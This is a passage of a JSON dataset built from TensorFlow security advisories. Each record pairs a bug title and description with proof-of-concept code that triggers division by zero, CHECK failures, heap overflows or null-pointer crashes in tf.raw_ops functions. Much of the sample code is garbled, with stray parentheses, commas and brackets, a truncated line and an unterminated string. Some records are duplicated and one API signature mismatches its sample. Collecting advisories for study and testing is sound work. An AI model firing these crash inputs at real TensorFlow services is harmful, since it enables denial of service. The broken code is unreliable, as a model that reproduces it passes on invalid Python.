    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr",
    "API Signature": "tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n    t,\n    t_min,\n    t_max,\n    m,\n    m_min,\n    m_max,\n    v,\n    v_min,\n    v_max,\n    beta,\n    beta_min,\n    beta_max,\n    gamma,\n    gamma_min,\n    gamma_max,\n    out_type,\n    variance_epsilon,\n    scale_after_normalization,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedBiasAdd`\n      ",
    "Bug description": "An attacker can trigger an integer division by zero undefined behavior in  tf.raw_ops.QuantizedBiasAdd :",
    "Sample Code": "input_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nbias = tf.constant([], shape=[0], dtype=tf.quint8)\nmin_input = tf.constant(-10.0, dtype=tf.float32)\nmax_input = tf.constant(-10.0, dtype=tf.float32)\nmin_bias = tf.constant(-10.0, dtype=tf.float32)\nmax_bias = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,\n                            max_input=max_input, min_bias=min_bias,\n                            ,\n                            max_bias=max_bias, out_type=tf.qint32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m34j-p8rj-wjxq",
    "API Signature": "tf.raw_ops.QuantizedBiasAdd(\n    input, bias, min_input, max_input, min_bias, max_bias, out_type, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `CTCGreedyDecoder`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in  tf.raw_ops.CTCGreedyDecoder :",
    "Sample Code": "inputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)\nsequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)\nmerge_repeated = False\n\n\n\ntf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fphq-gw9m-ghrv",
    "API Signature": "tf.raw_ops.CTCGreedyDecoder(\n    inputs, sequence_length, merge_repeated=False, blank_index=-1, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `QuantizeAndDequantizeV4Grad`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in  tf.raw_ops.QuantizeAndDequantizeV4Grad :",
    "Sample Code": "gradient_tensor = tf.constant([0.0], shape=[1])\ninput_tensor = tf.constant([0.0], shape=[1])\ninput_min = tf.constant([[0.0]], shape=[1, 1])\ninput_max = tf.constant([[0.0]], shape=[1, 1])\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=gradient_tensor, input=input_tensor,\n  ,\n  input_min=input_min, input_max=input_max, axis=0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6g85-3hm8-83f9",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients, input, input_min, input_max, axis=-1, name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `Conv2DBackpropFilter`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow to occur in  Conv2DBackpropFilter :",
    "Sample Code": "input_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)\nfilter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes, \n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1], \n  use_cudnn_on_gpu=True,\n  padding='VALID',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)]\n)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xgc3-m89p-vr3x",
    "API Signature": "tf.raw_ops.Conv2DBackpropFilter(\n    input,\n    filter_sizes,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `Conv2DBackpropFilter`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow to occur in  Conv2DBackpropFilter :",
    "Sample Code": "input_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)\nfilter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes, \n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1], \n  use_cudnn_on_gpu=True,\n  padding='VALID',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)]\n)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xgc3-m89p-vr3x",
    "API Signature": "tf.raw_ops.Conv2DBackpropFilter(\n    input,\n    filter_sizes,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `QuantizedReshape`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow in  QuantizedReshape  by passing in invalid thresholds for the quantization:",
    "Sample Code": "tensor = tf.constant([], dtype=tf.qint32)\nshape = tf.constant([], dtype=tf.int32)\ninput_min = tf.constant([], dtype=tf.float32)\ninput_max = tf.constant([], dtype=tf.float32)\n\n)\n\ntf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2gfx-95x2-5v3x",
    "API Signature": "tf.raw_ops.QuantizedReshape(\n    tensor, shape, input_min, input_max, name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `QuantizedResizeBilinear`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow in  QuantizedResizeBilinear  by passing in invalid thresholds for the quantization:",
    "Sample Code": "images = tf.constant([], shape=[0], dtype=tf.qint32)\nsize = tf.constant([], shape=[0], dtype=tf.int32) \nmin = tf.constant([], dtype=tf.float32)\nmax = tf.constant([], dtype=tf.float32)\n\n)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8c89-2vwr-chcq",
    "API Signature": "tf.raw_ops.QuantizedResizeBilinear(\n    images,\n    size,\n    min,\n    max,\n    align_corners=False,\n    half_pixel_centers=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `SparseConcat`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in  tf.raw_ops.SparseConcat :",
    "Sample Code": "import numpy as np\n\nindices_1 = tf.constant([[514, 514], [514, 514]], dtype=tf.int64)\nindices_2 = tf.constant([[514, 530], [599, 877]], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.zeros([0], dtype=tf.int64)\nvalues_2 = tf.zeros([0], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nshape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)\nshape_2 = tf.zeros([9], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\n]\n\ntf.raw_ops.SparseConcat(indices=indices, values=values, shapes=shapes, concat_dim=2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6j9c-grc6-5m6g",
    "API Signature": "tf.raw_ops.SparseConcat(\n    indices, values, shapes, concat_dim, name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `QuantizedMul`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow in  QuantizedMul  by passing in invalid thresholds for the quantization:",
    "Sample Code": "x = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\ny = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\nmin_x = tf.constant([], dtype=tf.float32)\nmax_x = tf.constant([], dtype=tf.float32)\nmin_y = tf.constant([], dtype=tf.float32)\nmax_y = tf.constant([], dtype=tf.float32)\n\n)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m3f9-w3p3-p669",
    "API Signature": "tf.raw_ops.QuantizedMul(\n    x,\n    y,\n    min_x,\n    max_x,\n    min_y,\n    max_y,\n    Toutput=tf.dtypes.qint32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `DrawBoundingBoxes`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK  failure by passing an empty image to  tf.raw_ops.DrawBoundingBoxes :",
    "Sample Code": "images = tf.fill([53, 0, 48, 1], 0.)\nboxes = tf.fill([53, 31, 4], 0.)\nboxes = tf.Variable(boxes)\nboxes[0, 0, 0].assign(3.90621)\n)\ntf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-393f-2jr3-cp69",
    "API Signature": "tf.raw_ops.DrawBoundingBoxes(\n    images, boxes, name=None\n)\n"
  },
  {
    "Title": "\n        Heap out of bounds read in `RaggedCross`\n      ",
    "Bug description": "An attacker can force accesses outside the bounds of heap allocated arrays by passing in invalid tensor values to  tf.raw_ops.RaggedCross :",
    "Sample Code": "ragged_values = []\nragged_row_splits = [] \nsparse_indices = []\nsparse_values = []\nsparse_shape = []\n\ndense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)\ndense_inputs = [dense_inputs_elem]\n\ninput_order = \"R\"\nhashed_output = False\nnum_buckets = 0\nhash_key = 0 \n\ntf.raw_ops.RaggedCross(ragged_values=ragged_values,\n    ragged_row_splits=ragged_row_splits,\n    sparse_indices=sparse_indices,\n    sparse_values=sparse_values,\n    sparse_shape=sparse_shape,\n    dense_inputs=dense_inputs,\n    input_order=input_order,\n    hashed_output=hashed_output,\n    num_buckets=num_buckets,\n    hash_key=hash_key,\n    out_values_type=tf.int64,\n    ,\n    out_row_splits_type=tf.int64)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j47f-4232-hvv8",
    "API Signature": "tf.raw_ops.RaggedCross(\n    ragged_values,\n    ragged_row_splits,\n    sparse_indices,\n    sparse_values,\n    sparse_shape,\n    dense_inputs,\n    input_order,\n    hashed_output,\n    num_buckets,\n    hash_key,\n    out_values_type,\n    out_row_splits_type,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `tf.raw_ops.EncodePng`\n      ",
    "Bug description": "An attacker can trigger a  CHECK  fail in PNG encoding by providing an empty input tensor as the pixel data:",
    "Sample Code": "image = tf.zeros([0, 0, 3])\nimage = tf.cast(image, dtype=tf.uint8) \n) \ntf.raw_ops.EncodePng(image=image) ",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3qxp-qjq7-w4hf",
    "API Signature": "tf.raw_ops.EncodePng(\n    image, compression=-1, name=None\n)\n"
  },
  {
    "Title": "\n        Invalid validation in `SparseMatrixSparseCholesky`\n      ",
    "Bug description": "An attacker can trigger a null pointer dereference by providing an invalid  permutation  to  tf.raw_ops.SparseMatrixSparseCholesky :",
    "Sample Code": "import numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([-10.0], dtype=np.float32)\ndense_shape = [1, 1]\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\ninput = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n\npermutation = tf.constant([], shape=[1, 0], dtype=tf.int32)\n \n)\n \ntf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xcwj-wfcm-m23c",
    "API Signature": "tf.raw_ops.SparseMatrixSparseCholesky(\n    input, permutation, type, name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedMul`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.QuantizedMul :",
    "Sample Code": "x = tf.zeros([4, 1], dtype=tf.quint8)\ny = tf.constant([], dtype=tf.quint8)\nmin_x = tf.constant(0.0)\nmax_x = tf.constant(0.0010000000474974513)\nmin_y = tf.constant(0.0)\nmax_y = tf.constant(0.0010000000474974513)\n\n)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6f84-42vf-ppwp",
    "API Signature": "tf.raw_ops.QuantizedMul(\n    x,\n    y,\n    min_x,\n    max_x,\n    min_y,\n    max_y,\n    Toutput=tf.dtypes.qint32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedConv2D`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.QuantizedConv2D :",
    "Sample Code": "input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)\nfilter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)\nmin_input = tf.constant(0.0)\nmax_input = tf.constant(0.0001)\nmin_filter = tf.constant(0.0)\nmax_filter = tf.constant(0.0001)\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"               \n                               \n\n               \n                               \n\ntf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4g7-fvjj-prg8",
    "API Signature": "tf.raw_ops.QuantizedConv2D(\n    input,\n    filter,\n    min_input,\n    max_input,\n    min_filter,\n    max_filter,\n    strides,\n    padding,\n    out_type=tf.dtypes.qint32,\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedConv2D`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.QuantizedConv2D :",
    "Sample Code": "input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)\nfilter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)\nmin_input = tf.constant(0.0)\nmax_input = tf.constant(0.0001)\nmin_filter = tf.constant(0.0)\nmax_filter = tf.constant(0.0001)\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"               \n                               \n\n               \n                               \n\ntf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4g7-fvjj-prg8",
    "API Signature": "tf.raw_ops.QuantizedConv2D(\n    input,\n    filter,\n    min_input,\n    max_input,\n    min_filter,\n    max_filter,\n    strides,\n    padding,\n    out_type=tf.dtypes.qint32,\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `Conv2D`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.Conv2D :",
    "Sample Code": "input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n                               \n\n                               \ntf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4vf2-4xcg-65cx",
    "API Signature": "tf.raw_ops.Conv2D(\n    input,\n    filter,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `Conv2DBackpropInput`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.Conv2DBackpropInput :",
    "Sample Code": "input_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,\n                               out_backprop=out_backprop, strides=[1, 1, 1, 1],\n                               use_cudnn_on_gpu=True, padding='SAME',\n                               explicit_paddings=[], data_format='NHWC',\n                               ,\n                               dilations=[1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xm2v-8rrw-w9pm",
    "API Signature": "tf.raw_ops.Conv2DBackpropInput(\n    input_sizes,\n    filter,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `Conv2DBackpropFilter`\n      ",
    "Bug description": "An attacker can trigger a division by 0 in  tf.raw_ops.Conv2DBackpropFilter :",
    "Sample Code": "input_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding='SAME', explicit_paddings=[],\n                                [],\n                                data_format='NHWC', dilations=[1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4pj-74mg-8868",
    "API Signature": "tf.raw_ops.Conv2DBackpropFilter(\n    input,\n    filter_sizes,\n    out_backprop,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `AddManySparseToTensorsMap`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in   tf.raw_ops.AddManySparseToTensorsMap :",
    "Sample Code": "import numpy as np\n\nsparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)\nsparse_values = tf.ones([1], dtype=tf.int64)\n\nshape = tf.Variable(tf.ones([55], dtype=tf.int64))\nshape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))\n\ntf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,\n                    sparse_values=sparse_values,\n                    ,\n                    sparse_shape=shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2cpx-427x-q2c6",
    "API Signature": "tf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices,\n    sparse_values,\n    sparse_shape,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `Conv3DBackprop*`\n      ",
    "Bug description": "The  tf.raw_ops.Conv3DBackprop*  operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:",
    "Sample Code": "input_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\n)\n\ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c968-pq7h-7fxv",
    "API Signature": "tf.raw_ops.Conv3DBackpropFilterV2(\n    input,\n    filter_sizes,\n    out_backprop,\n    strides,\n    padding,\n    data_format='NDHWC',\n    dilations=[1, 1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `Conv3DBackprop*`\n      ",
    "Bug description": "Missing validation between arguments to  tf.raw_ops.Conv3DBackprop*  operations can result in heap buffer overflows:",
    "Sample Code": "input_values = [-10.0] * (7 * 7 * 7 * 7 * 7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \n)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wcv5-qrj6-9pfm",
    "API Signature": "tf.raw_ops.Conv3DBackpropInputV2(\n    input_sizes,\n    filter,\n    out_backprop,\n    strides,\n    padding,\n    data_format='NDHWC',\n    dilations=[1, 1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `SparseCountSparseOutput`\n      ",
    "Bug description": "Specifying a negative dense shape in  tf.raw_ops.SparseCountSparseOutput  results in a segmentation fault being thrown out from the standard library as  std::vector  invariants are broken.",
    "Sample Code": "indices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0, 0], dtype=tf.int64)\ndense_shape = tf.constant([-100, -100, -100], shape=[3], dtype=tf.int64)\nweights = tf.constant([], shape=[0, 0], dtype=tf.int64)\n\n)\n\ntf.raw_ops.SparseCountSparseOutput(indices=indices, values=values, dense_shape=dense_shape, weights=weights, minlength=79, maxlength=96, binary_output=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hr84-fqvp-48mm",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `SparseCross` due to type confusion\n      ",
    "Bug description": "The API of  tf.raw_ops.SparseCross  allows combinations which would result in a  CHECK -failure and denial of service:",
    "Sample Code": "hashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\nout_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4, 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\ntf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,\n                       ,\n                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772j-h9xw-ffp5",
    "API Signature": "tf.raw_ops.SparseCross(\n    indices,\n    values,\n    shapes,\n    dense_inputs,\n    hashed_output,\n    num_buckets,\n    hash_key,\n    out_type,\n    internal_type,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Session operations in eager mode lead to null pointer dereferences\n      ",
    "Bug description": "In eager mode (default in TF 2.0 and later), session operations are invalid. However, users could still call the raw ops associated with them and trigger a null pointer dereference:",
    "Sample Code": " tensorflow as tf\ntf.raw_ops.DeleteSessionTensor(handle=['])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-62gx-355r-9fhg",
    "API Signature": "tf.raw_ops.GetSessionTensor(\n    handle, dtype, name=None\n)\n"
  },
  {
    "Title": "\n        Division by zero in `Conv3D`\n      ",
    "Bug description": "A malicious user could trigger a division by 0 in  Conv3D  implementation:",
    "Sample Code": "input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\n)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772p-x54p-hjrv",
    "API Signature": "tf.raw_ops.Conv3D(\n    input,\n    filter,\n    strides,\n    padding,\n    data_format='NDHWC',\n    dilations=[1, 1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by zero in `Conv3D`\n      ",
    "Bug description": "A malicious user could trigger a division by 0 in  Conv3D  implementation:",
    "Sample Code": "input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\n)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772p-x54p-hjrv",
    "API Signature": "tf.raw_ops.Conv3D(\n    input,\n    filter,\n    strides,\n    padding,\n    data_format='NDHWC',\n    dilations=[1, 1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to null pointer in `MatrixDiag*` ops\n      ",
    "Bug description": "The implementation of  MatrixDiag*  does not validate that the tensor arguments are non-empty:",
    "Sample Code": "d = tf.convert_to_tensor([],dtype=tf.float32)\np = tf.convert_to_tensor([],dtype=tf.float32)\n)\ntf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hc6c-75p4-hmq4",
    "API Signature": "tf.raw_ops.MatrixDiagV2(\n    diagonal, k, num_rows, num_cols, padding_value, name=None\n)\n"
  },
  {
    "Title": "\n        Heap out of bounds write in `RaggedBinCount`\n      ",
    "Bug description": "If the  splits  argument of  RaggedBincount  does not specify a valid  SparseTensor , then an attacker can trigger a heap buffer overflow:",
    "Sample Code": "tf.raw_ops.RaggedBincount(splits=[7,8], values= [5, 16, 51, 76, 29, 27, 54, 95],\\\n                          size= 59, weights= [0, 0, 0, 0, 0, 0, 0, 0],\\\n                          ],\\\n                          binary_output=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8h46-5m9h-7553",
    "API Signature": "tf.raw_ops.RaggedBincount(\n    splits, values, size, weights, binary_output=False, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in tf.raw_ops.ImmutableConst\n      ",
    "Bug description": "Calling  tf.raw_ops.ImmutableConst  with a  dtype  of  tf.resource  or  tf.variant  results in a segfault in the implementation as code assumes that the tensor contents are pure scalars.",
    "Sample Code": ">>> tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[], memory_region_name=\"/tmp/test.txt\")\n...\n)\n...\nSegmentation fault",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g4h2-gqm3-c9wq",
    "API Signature": "tf.raw_ops.ImmutableConst(\n    dtype, shape, memory_region_name, name=None\n)\n"
  },
  {
    "Title": "\n        Write to immutable memory region\n      ",
    "Bug description": "The  tf.raw_ops.ImmutableConst  operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:",
    "Sample Code": ">>> with open('/tmp/test.txt','w') as f: f.write('a'*128)\n>>> tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,\n                              ,\n                              memory_region_name='/tmp/test.txt')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hhvc-g5hv-48c6",
    "API Signature": "tf.raw_ops.ImmutableConst(\n    dtype, shape, memory_region_name, name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
